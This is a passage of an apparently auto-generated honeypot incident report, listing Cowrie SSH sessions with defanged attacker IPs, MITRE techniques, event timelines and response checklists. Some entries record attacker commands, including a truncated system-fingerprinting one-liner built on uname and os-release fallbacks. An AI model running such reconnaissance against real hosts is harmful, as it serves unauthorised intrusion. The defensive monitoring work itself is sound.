| `2026-07-08 03:27:20` | `cowrie.client.kex` |
| `2026-07-08 03:27:22` | `cowrie.login.success` |
| `2026-07-08 03:27:22` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c08c06ce14

| Field | Detail |
|---|---|
| **Source IP** | `35.241.189[.]214` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:27` | `cowrie.session.connect` |
| `2026-07-08 03:27:27` | `cowrie.login.success` |
| `2026-07-08 03:27:27` | `cowrie.session.params` |
| `2026-07-08 03:27:27` | `cowrie.command.input` |
| `2026-07-08 03:27:27` | `cowrie.command.failed` |
| `2026-07-08 03:27:32` | `cowrie.log.closed` |
| `2026-07-08 03:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.189[.]214` to AbuseIPDB if not already reported
- [ ] Block `35.241.189[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9395074e52e

| Field | Detail |
|---|---|
| **Source IP** | `35.241.189[.]214` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:29` | `cowrie.session.connect` |
| `2026-07-08 03:27:29` | `cowrie.login.success` |
| `2026-07-08 03:27:29` | `cowrie.session.params` |
| `2026-07-08 03:27:29` | `cowrie.command.input` |
| `2026-07-08 03:27:32` | `cowrie.log.closed` |
| `2026-07-08 03:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.189[.]214` to AbuseIPDB if not already reported
- [ ] Block `35.241.189[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4764a294bba5

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:05` | `cowrie.session.connect` |
| `2026-07-08 03:28:05` | `cowrie.client.version` |
| `2026-07-08 03:28:06` | `cowrie.client.kex` |
| `2026-07-08 03:28:06` | `cowrie.login.success` |
| `2026-07-08 03:28:06` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:28:06` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7817f8b236

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:09` | `cowrie.session.connect` |
| `2026-07-08 03:28:09` | `cowrie.client.version` |
| `2026-07-08 03:28:09` | `cowrie.client.kex` |
| `2026-07-08 03:28:09` | `cowrie.login.success` |
| `2026-07-08 03:28:09` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:28:09` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e595bffe678

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:13` | `cowrie.session.connect` |
| `2026-07-08 03:28:13` | `cowrie.client.version` |
| `2026-07-08 03:28:13` | `cowrie.client.kex` |
| `2026-07-08 03:28:14` | `cowrie.login.success` |
| `2026-07-08 03:28:15` | `cowrie.session.params` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.success` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:15` | `cowrie.command.input` |
| `2026-07-08 03:28:16` | `cowrie.log.closed` |
| `2026-07-08 03:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b5cd2c88583

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:15` | `cowrie.session.connect` |
| `2026-07-08 03:28:15` | `cowrie.client.version` |
| `2026-07-08 03:28:15` | `cowrie.client.kex` |
| `2026-07-08 03:28:16` | `cowrie.login.success` |
| `2026-07-08 03:28:16` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:28:16` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-658a759084f3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:26` | `cowrie.session.connect` |
| `2026-07-08 03:28:26` | `cowrie.client.version` |
| `2026-07-08 03:28:26` | `cowrie.client.kex` |
| `2026-07-08 03:28:26` | `cowrie.login.success` |
| `2026-07-08 03:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb2717d132a8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:26` | `cowrie.session.connect` |
| `2026-07-08 03:28:26` | `cowrie.client.version` |
| `2026-07-08 03:28:26` | `cowrie.client.kex` |
| `2026-07-08 03:28:26` | `cowrie.login.success` |
| `2026-07-08 03:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93b6b8b00a67

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:30` | `cowrie.session.connect` |
| `2026-07-08 03:28:30` | `cowrie.client.version` |
| `2026-07-08 03:28:30` | `cowrie.client.kex` |
| `2026-07-08 03:28:31` | `cowrie.login.success` |
| `2026-07-08 03:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a343dd84f10a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:31` | `cowrie.session.connect` |
| `2026-07-08 03:28:31` | `cowrie.client.version` |
| `2026-07-08 03:28:31` | `cowrie.client.kex` |
| `2026-07-08 03:28:32` | `cowrie.login.success` |
| `2026-07-08 03:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f81ac035f503

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:45` | `cowrie.session.connect` |
| `2026-07-08 03:28:45` | `cowrie.client.version` |
| `2026-07-08 03:28:45` | `cowrie.client.kex` |
| `2026-07-08 03:28:45` | `cowrie.login.success` |
| `2026-07-08 03:28:46` | `cowrie.session.params` |
| `2026-07-08 03:28:46` | `cowrie.command.input` |
| `2026-07-08 03:28:46` | `cowrie.log.closed` |
| `2026-07-08 03:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1494ca2b8bfe

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:47` | `cowrie.session.connect` |
| `2026-07-08 03:28:47` | `cowrie.client.version` |
| `2026-07-08 03:28:47` | `cowrie.client.kex` |
| `2026-07-08 03:28:47` | `cowrie.login.success` |
| `2026-07-08 03:28:48` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:28:48` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8c49933b60

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:28 |
| **Last Seen** | 2026-07-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:28:54` | `cowrie.session.connect` |
| `2026-07-08 03:28:54` | `cowrie.client.version` |
| `2026-07-08 03:28:54` | `cowrie.client.kex` |
| `2026-07-08 03:28:55` | `cowrie.login.success` |
| `2026-07-08 03:28:55` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:28:55` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdea91b3e466

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:29 |
| **Last Seen** | 2026-07-08 03:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:29:07` | `cowrie.session.connect` |
| `2026-07-08 03:29:07` | `cowrie.client.version` |
| `2026-07-08 03:29:07` | `cowrie.client.kex` |
| `2026-07-08 03:29:08` | `cowrie.login.success` |
| `2026-07-08 03:29:08` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:29:08` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec56e41ae2fa

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 03:29 |
| **Last Seen** | 2026-07-08 03:29 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:29:15` | `cowrie.session.connect` |
| `2026-07-08 03:29:16` | `cowrie.client.version` |
| `2026-07-08 03:29:16` | `cowrie.client.kex` |
| `2026-07-08 03:29:24` | `cowrie.login.success` |
| `2026-07-08 03:29:27` | `cowrie.session.params` |
| `2026-07-08 03:29:27` | `cowrie.command.input` |
| `2026-07-08 03:29:28` | `cowrie.log.closed` |
| `2026-07-08 03:29:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d466a9350905

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:29 |
| **Last Seen** | 2026-07-08 03:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:29:15` | `cowrie.session.connect` |
| `2026-07-08 03:29:15` | `cowrie.client.version` |
| `2026-07-08 03:29:16` | `cowrie.client.kex` |
| `2026-07-08 03:29:17` | `cowrie.login.success` |
| `2026-07-08 03:29:17` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:29:17` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aad3a67e596

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:29 |
| **Last Seen** | 2026-07-08 03:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:29:47` | `cowrie.session.connect` |
| `2026-07-08 03:29:47` | `cowrie.client.version` |
| `2026-07-08 03:29:47` | `cowrie.client.kex` |
| `2026-07-08 03:29:48` | `cowrie.login.success` |
| `2026-07-08 03:29:48` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:29:48` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcbf72236b8c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:30 |
| **Last Seen** | 2026-07-08 03:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:30:08` | `cowrie.session.connect` |
| `2026-07-08 03:30:08` | `cowrie.client.version` |
| `2026-07-08 03:30:08` | `cowrie.client.kex` |
| `2026-07-08 03:30:10` | `cowrie.login.success` |
| `2026-07-08 03:30:11` | `cowrie.session.params` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.success` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:11` | `cowrie.command.input` |
| `2026-07-08 03:30:12` | `cowrie.log.closed` |
| `2026-07-08 03:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-019d227c2a10

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:30 |
| **Last Seen** | 2026-07-08 03:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:30:29` | `cowrie.session.connect` |
| `2026-07-08 03:30:29` | `cowrie.client.version` |
| `2026-07-08 03:30:29` | `cowrie.client.kex` |
| `2026-07-08 03:30:30` | `cowrie.login.success` |
| `2026-07-08 03:30:30` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:30:30` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-525187caa2f1

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:31 |
| **Last Seen** | 2026-07-08 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:31:11` | `cowrie.session.connect` |
| `2026-07-08 03:31:11` | `cowrie.client.version` |
| `2026-07-08 03:31:11` | `cowrie.client.kex` |
| `2026-07-08 03:31:11` | `cowrie.login.success` |
| `2026-07-08 03:31:11` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:31:12` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b783fc55633

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:31 |
| **Last Seen** | 2026-07-08 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:31:16` | `cowrie.session.connect` |
| `2026-07-08 03:31:16` | `cowrie.client.version` |
| `2026-07-08 03:31:16` | `cowrie.client.kex` |
| `2026-07-08 03:31:16` | `cowrie.login.success` |
| `2026-07-08 03:31:16` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:31:16` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6cb81e826d

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:31 |
| **Last Seen** | 2026-07-08 03:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:31:52` | `cowrie.session.connect` |
| `2026-07-08 03:31:52` | `cowrie.client.version` |
| `2026-07-08 03:31:52` | `cowrie.client.kex` |
| `2026-07-08 03:31:53` | `cowrie.login.success` |
| `2026-07-08 03:31:53` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:31:53` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:31:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993ab53c849f

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:31 |
| **Last Seen** | 2026-07-08 03:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:31:57` | `cowrie.session.connect` |
| `2026-07-08 03:31:57` | `cowrie.client.version` |
| `2026-07-08 03:31:57` | `cowrie.client.kex` |
| `2026-07-08 03:31:58` | `cowrie.login.success` |
| `2026-07-08 03:31:58` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:31:58` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:31:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6d9f891123

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:32 |
| **Last Seen** | 2026-07-08 03:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
